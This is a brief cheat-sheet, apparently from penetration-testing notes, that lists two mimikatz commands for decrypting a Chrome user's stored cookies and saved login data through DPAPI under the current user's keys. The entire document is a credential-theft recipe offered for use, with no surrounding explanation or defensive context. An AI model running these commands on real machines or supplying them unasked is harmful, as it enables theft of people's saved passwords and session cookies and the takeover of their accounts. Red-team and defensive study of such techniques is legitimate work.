# Chrome cookies & passwords

When running as the current user, the /unprotect flag will use the current keys to decrypt the DPAPI data.

### Cookies

```text
mimikatz dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” /unprotect
```

### Saved login data

```text
mimikatz dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```



